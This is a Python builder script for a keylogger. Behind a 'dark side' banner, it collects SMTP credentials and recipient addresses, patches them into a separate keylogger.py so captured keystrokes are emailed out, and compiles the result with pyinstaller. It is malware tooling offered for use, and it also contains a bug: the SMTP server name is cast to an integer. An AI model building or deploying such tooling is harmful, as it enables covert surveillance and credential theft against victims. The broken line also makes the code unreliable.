import os 

print("""
 ██████╗  █████╗ ███████╗███████╗██╗   ██╗    ██╗     ██╗ ██████╗ ███████╗██╗
██╔════╝ ██╔══██╗██╔════╝██╔════╝██║   ██║    ██║     ██║██╔═══██╗██╔════╝██║
██║  ███╗███████║███████╗█████╗  ██║   ██║    ██║     ██║██║   ██║███████╗██║
██║   ██║██╔══██║╚════██║██╔══╝  ██║   ██║    ██║     ██║██║   ██║╚════██║██║
╚██████╔╝██║  ██║███████║███████╗╚██████╔╝    ███████╗██║╚██████╔╝███████║██║
 ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝     ╚══════╝╚═╝ ╚═════╝ ╚══════╝╚═╝

                     *** WELCOME TO THE DARK SIDE ***
            Be warned... every keystroke will be watched closely.
            There’s no turning back now. Are you prepared?
""")
sender_email = input("Enter your sender email: ")
receiver_email = input("Enter your receiver email: ")
smtp_server = int(input("Enter SMTP server: "))
smtp_port = int(input("Enter the SMTP Port: "))
smtp_password = input("Enter SMTP Password: ")

with open('keylogger.py','r+') as file:
    content=file.readlines()
    content[40] = f'sender_email = "{sender_email}"\n'
    content[41] = f'receiver_email = "{receiver_email}"\n'
    content[42] = f'smtp_server = "{smtp_server}"\n'
    content[43] = f'smtp_port = "{smtp_port}"\n'
    content[44] = f'smtp_password = "{smtp_password}"\n'
    file.seek(0)
    file.writelines(content)


os.system('pyinstaller keylogger.py')